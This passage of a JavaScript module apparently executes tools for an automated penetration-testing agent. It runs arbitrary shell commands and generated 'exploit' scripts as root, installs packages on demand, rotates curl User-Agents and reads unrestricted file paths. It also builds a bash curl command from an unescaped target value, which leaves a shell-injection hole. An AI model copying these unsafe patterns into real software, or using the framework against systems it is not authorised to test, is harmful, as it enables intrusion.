    return _installTool(sessionId, execId, toolId, params, workspace, outputFile, runId);
  if (toolDef.isFileOp)
    return _handleFileOp(sessionId, toolId, params, workspace, outputFile, runId);
  if (toolDef.isScriptOp)
    return _handleScriptOp(sessionId, toolId, params, workspace, outputFile, runId);
  if (toolDef.isUserScript)
    return _handleUserScript(sessionId, toolId, params, workspace, outputFile, runId);
  if (toolDef.isVpsOp)
    return _handleVpsOp(sessionId, toolId, params, workspace, outputFile, runId);

  return _spawnTool(sessionId, toolId, toolDef, params, workspace, outputFile, runId);
}

// ─────────────────────────────────────────────────────────────────────────────
// EXECUTION PRIMITIVES
// ─────────────────────────────────────────────────────────────────────────────

/** Core process runner — used by all other handlers */
function _runProcess(sessionId, toolId, label, cmd, cmdArgs, opts = {}) {
  const { workspace, outputFile, runId, timeout, env: extraEnv } = opts;
  const env = { ...BASE_ENV, ...(extraEnv||{}) };
  const timeoutMs = timeout || TIMEOUTS.shell;

  broadcaster.toolStart(sessionId, null, toolId, label, [cmd, ...cmdArgs].join(' ').slice(0,120));

  // ── Cache check: for read-only curl GET requests, return cached response ──
  const _isCurlGet = (cmd === 'curl') && !cmdArgs.some(a => ['-X','--request'].includes(a) && cmdArgs[cmdArgs.indexOf(a)+1] && !['GET'].includes(cmdArgs[cmdArgs.indexOf(a)+1]));
  const _cacheUrl  = _isCurlGet ? cmdArgs.find(a => a.startsWith('http')) : null;
  if (_cacheUrl) {
    const _cached = getCached(_cacheUrl, 'GET');
    if (_cached) {
      broadcaster.toolEnd(sessionId, null, toolId, label, true, 0);
      return { runId, toolId, success: true, output: _cached, exitCode: 0,
        executedAt: new Date().toISOString(), fromCache: true };
    }
  }

  // Inject rotated User-Agent into curl commands
  const finalCmdArgs = [...cmdArgs];
  if (cmd === 'curl' && !cmdArgs.some(a => a === '-A' || a === '--user-agent')) {
    finalCmdArgs.splice(1, 0, '-A', getNextUA());
  }

  return new Promise((resolve) => {
    let output = ''; let timedOut = false;

    const proc = spawn(cmd, finalCmdArgs, {
      cwd: workspace || WORKSPACE,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
      shell: false,
    });

    const timer = setTimeout(() => {
      timedOut = true;
      proc.kill('SIGTERM');
      setTimeout(() => proc.kill('SIGKILL'), 3000);
    }, timeoutMs);

    proc.stdout.on('data', c => {
      const t = c.toString();
      output += t;
      broadcaster.toolOutput(sessionId, null, toolId, t);
    });
    proc.stderr.on('data', c => {
      const t = c.toString();
      output += t;
      // Stream stderr too so agent can see install progress
      if (t.trim()) broadcaster.toolOutput(sessionId, null, toolId, t);
    });

    proc.on('close', async code => {
      clearTimeout(timer);
      if (outputFile) await fs.writeFile(outputFile, output, 'utf8').catch(() => {});
      const result = {
        runId, toolId,
        success:   !timedOut && code === 0,
        timedOut,
        exitCode:  code,
        output,
        outputFile,
        executedAt: new Date().toISOString(),
      };
      // Cache successful GET curl responses for 30s dedup
      if (result.success && _cacheUrl && output.length > 50) setCached(_cacheUrl, 'GET', output);
      broadcaster.toolDone(sessionId, null, toolId, result);
      resolve(result);
    });

    proc.on('error', err => {
      clearTimeout(timer);
      const result = {
        runId, toolId, success: false,
        output: `Process error: ${err.message}\n\nTry installing the tool first: install_tool with package_name="${cmd}"`,
        outputFile, executedAt: new Date().toISOString(),
      };
      // Cache successful GET curl responses for 30s dedup
      if (result.success && _cacheUrl && output.length > 50) setCached(_cacheUrl, 'GET', output);
      broadcaster.toolDone(sessionId, null, toolId, result);
      resolve(result);
    });
  });
}

/** Run arbitrary bash command/pipeline */
function _runShell(sessionId, execId, toolId, toolDef, params, workspace, outputFile, runId) {
  // Support both {command: "..."} string AND buildShell: fn that returns
  // either a string command OR an argv array like ['bash', '-c', '...']
  let command;
  if (toolDef.buildShell) {
    command = toolDef.buildShell(params);
  } else {
    command = params.command || params.cmd || params.shell || '';
    if (!command && params.target) {
      command = `curl -s --max-time 15 '${params.target}'`;
    }
  }
  if (!command) return Promise.resolve({ runId, toolId, success: false, output: 'No command provided', executedAt: new Date().toISOString() });

  // ── If buildShell returned an argv array, spawn it directly ───────────────
  // (Some tools like spinel_reflection return ['bash','-c','complex pipeline'])
  // Stringifying an array via template literal joins with commas, producing
  // garbage like "bash,-c,echo ..." — must spawn the array as-is.
  if (Array.isArray(command)) {
    const argv = command.slice();
    const program = argv.shift() || 'bash';
    const display = `${program} ${argv.map(a => a.length > 60 ? a.slice(0, 60) + '...' : a).join(' ')}`;
    broadcaster.log(sessionId, execId, 'info', `[SHELL] ${display.slice(0,200)}`);
    return _runProcess(sessionId, toolId, toolDef.label||'Shell', program, argv,
      { workspace, outputFile, runId, timeout: params.timeout || TIMEOUTS.shell });
  }

  // String path — wrap with bash -c as before
  // Inject cookie/auth header into shell commands that use curl
  if (params.cookie_header && command.includes('curl') && !command.includes('-H') && !command.includes('Cookie:')) {
    command = command.replace(/curl\s/, `curl -H 'Cookie: ${params.cookie_header}' `);
  }

  broadcaster.log(sessionId, execId, 'info', `[SHELL] ${command.slice(0,100)}`);
  return _runProcess(sessionId, toolId, toolDef.label||'Shell', 'bash', ['-c', command],
    { workspace, outputFile, runId, timeout: params.timeout || TIMEOUTS.shell });
}

/** Write a script file then execute it */
async function _runScript(sessionId, execId, toolId, params, workspace, outputFile, runId) {
  const {
    filename = 'exploit.sh',
    content,
    code,                   // alias for content
    script,                 // alias for content
    interpreter = 'bash',
    args: scriptArgs = [],
    timeout,
  } = params;

  const src = content || code || script || '';
  if (!src) return { runId, toolId, success: false, output: 'No script content provided', executedAt: new Date().toISOString() };

  const safeName   = path.basename(filename).replace(/[^a-zA-Z0-9._-]/g, '_');
  const scriptPath = path.join(workspace, safeName);
  await fs.writeFile(scriptPath, src, 'utf8');
  await fs.chmod(scriptPath, '0755');

  broadcaster.log(sessionId, execId, 'info', `[SCRIPT] Wrote ${safeName} (${src.length}b), executing with ${interpreter}...`);

  return _runProcess(sessionId, toolId, `Script: ${safeName}`, interpreter, [scriptPath, ...scriptArgs],
    { workspace, outputFile, runId, timeout: timeout || TIMEOUTS.script });
}

/** Run a Python script or snippet */
async function _runPython(sessionId, execId, toolId, params, workspace, outputFile, runId) {
  const { content, code, script, filename = 'exploit.py', args: pyArgs = [], timeout } = params;
  const src = content || code || script || '';
  if (!src) return { runId, toolId, success: false, output: 'No Python code provided', executedAt: new Date().toISOString() };

  const safeName   = path.basename(filename.endsWith('.py') ? filename : filename+'.py').replace(/[^a-zA-Z0-9._-]/g, '_');
  const scriptPath = path.join(workspace, safeName);
  await fs.writeFile(scriptPath, src, 'utf8');

  broadcaster.log(sessionId, execId, 'info', `[PYTHON] Running ${safeName}...`);

  return _runProcess(sessionId, toolId, `Python: ${safeName}`, 'python3', [scriptPath, ...pyArgs],
    { workspace, outputFile, runId, timeout: timeout || TIMEOUTS.script });
}

/** Install a tool from apt, pip, go, cargo, npm, or GitHub */
async function _installTool(sessionId, execId, toolId, params, workspace, outputFile, runId) {
  const {
    tool_name, package_name, method = 'auto',
    github_url,   // e.g. github.com/hakluke/hakrawler
    binary_name,  // what to call the installed binary
    install_cmd,  // completely custom install command
  } = params;

  const pkg  = package_name || tool_name || github_url || '';
  const name = binary_name  || pkg.split('/').pop().split('@')[0];

  broadcaster.log(sessionId, execId, 'info', `[INSTALL] ${pkg} via ${method}...`);

  // Custom install command takes absolute priority
  if (install_cmd) {
    return _runProcess(sessionId, toolId, `Install: ${name}`, 'bash', ['-c', install_cmd],
      { workspace, outputFile, runId, timeout: params.timeout || TIMEOUTS.install,
        env: { GOPATH: '/root/go', HOME: '/root', DEBIAN_FRONTEND: 'noninteractive' }});
  }

  // Auto-detect method
  let cmd, cmdArgs;

  if (method === 'go' || (method === 'auto' && pkg.includes('/'))) {
    cmd = 'go'; cmdArgs = ['install', pkg.includes('@') ? pkg : `${pkg}@latest`];
  } else if (method === 'pip' || method === 'pip3' || (method === 'auto' && (pkg.includes('==') || pkg.startsWith('python')))) {
    cmd = 'pip3'; cmdArgs = ['install', '--quiet', '--break-system-packages', pkg];
  } else if (method === 'cargo') {
    cmd = 'cargo'; cmdArgs = ['install', pkg];
  } else if (method === 'npm') {
    cmd = 'npm'; cmdArgs = ['install', '-g', pkg];
  } else if (method === 'github' || method === 'curl') {
    // Download release binary from GitHub releases
    const installScript = `
set -e
TOOL="${name}"
REPO="${github_url || pkg}"
echo "[+] Installing $TOOL from $REPO"
if command -v go &>/dev/null && [[ "$REPO" == *"github.com"* ]]; then
  go install "${pkg.includes('@') ? pkg : pkg+'@latest'}" && echo "[+] Installed via go" && exit 0
fi
# Try direct apt as fallback
apt-get install -y --no-install-recommends "$TOOL" 2>/dev/null && echo "[+] Installed via apt" && exit 0
echo "[!] Could not install $TOOL automatically. Try specifying install_cmd."
exit 1`;
    return _runProcess(sessionId, toolId, `Install GitHub: ${name}`, 'bash', ['-c', installScript],
      { workspace, outputFile, runId, timeout: params.timeout || TIMEOUTS.install });
  } else {
    // Default: apt-get
    cmd = 'apt-get'; cmdArgs = ['install', '-y', '--no-install-recommends', pkg];
  }

  return _runProcess(sessionId, toolId, `Install: ${name}`, cmd, cmdArgs,
    { workspace, outputFile, runId, timeout: params.timeout || TIMEOUTS.install,
      env: { GOPATH: '/root/go', HOME: '/root', DEBIAN_FRONTEND: 'noninteractive' }});
}

/** Regular tool with buildCommand */
function _spawnTool(sessionId, toolId, toolDef, params, workspace, outputFile, runId) {
  let command;
  try { command = toolDef.buildCommand(params); }
  catch (e) {
    return Promise.resolve({ runId, toolId, success: false,
      output: `Bad params: ${e.message}`, outputFile, executedAt: new Date().toISOString() });
  }
  const [bin, ...args] = command;
  return _runProcess(sessionId, toolId, toolDef.label, bin, args,
    { workspace, outputFile, runId, timeout: TIMEOUTS[toolDef.category] || TIMEOUTS.default });
}

// ─────────────────────────────────────────────────────────────────────────────
// LEGACY HANDLERS (kept for backward compatibility)
// ─────────────────────────────────────────────────────────────────────────────

async function _handleFileOp(sessionId, toolId, params, workspace, outputFile, runId) {
  try {
    if (toolId === 'read_file' || toolId === 'read_vps_file') {
      const filePath = params.file_path || params.path || params.filename || '';
      if (!filePath) return { runId, toolId, success: false, output: 'No file path', outputFile, executedAt: new Date().toISOString() };
      const content = await fs.readFile(filePath, 'utf8');
      return { runId, toolId, success: true, output: content, outputFile, executedAt: new Date().toISOString() };
    }
    if (toolId === 'write_script') {
      const { filename, content, mode = '0755' } = params;
      const safeName   = path.basename(filename || 'script.sh').replace(/[^a-zA-Z0-9._-]/g, '_');
      const scriptPath = path.join(workspace, safeName);
      await fs.writeFile(scriptPath, content || '', 'utf8');
      await fs.chmod(scriptPath, mode);
      return { runId, toolId, success: true, output: `Wrote ${scriptPath}`, scriptPath, outputFile, executedAt: new Date().toISOString() };
    }
    if (toolId === 'write_and_run') {
      return _runScript(sessionId, null, toolId, params, workspace, outputFile, runId);
    }
    return { runId, toolId, success: false, output: `Unknown file op: ${toolId}`, outputFile, executedAt: new Date().toISOString() };
  } catch (err) {
    return { runId, toolId, success: false, output: `File op error: ${err.message}`, outputFile, executedAt: new Date().toISOString() };
  }
}

function _handleScriptOp(sessionId, toolId, params, workspace, outputFile, runId) {
  const { scriptPath, interpreter = 'bash', args: scriptArgs = [] } = params;
  if (!scriptPath) return Promise.resolve({ runId, toolId, success: false, output: 'No scriptPath', outputFile, executedAt: new Date().toISOString() });
  const resolved = path.resolve(scriptPath);
  return _runProcess(sessionId, toolId, `Script: ${path.basename(scriptPath)}`, interpreter, [resolved, ...scriptArgs],
    { workspace, outputFile, runId, timeout: TIMEOUTS.script });
}

function _handleUserScript(sessionId, toolId, params, workspace, outputFile, runId) {
  const { script_name, args: scriptArgs = [] } = params;
  const scriptPath = path.join(SCRIPTS_DIR, script_name || '');
  return _runProcess(sessionId, toolId, `User: ${script_name}`, 'bash', [scriptPath, ...scriptArgs],
    { workspace, outputFile, runId, timeout: TIMEOUTS.script * 5 }); // 15 min for user scripts
}

async function _handleVpsOp(sessionId, toolId, params, workspace, outputFile, runId) {
  try {
    if (toolId === 'list_vps_dir') {
      const dirPath = params.path || params.directory || workspace;
      const entries = await fs.readdir(dirPath);
      const output  = entries.join('\n');
      return { runId, toolId, success: true, output, outputFile, executedAt: new Date().toISOString() };
    }
    if (toolId === 'read_vps_file') {
      const content = await fs.readFile(params.path || params.file_path || '', 'utf8');
      return { runId, toolId, success: true, output: content.slice(0, 50000), outputFile, executedAt: new Date().toISOString() };
    }
    return { runId, toolId, success: false, output: 'Unknown VPS op', outputFile, executedAt: new Date().toISOString() };
  } catch (err) {
    return { runId, toolId, success: false, output: `VPS op error: ${err.message}`, outputFile, executedAt: new Date().toISOString() };
  }
}

module.exports = { executeTool, APPROVED_TOOLS, registerTool };
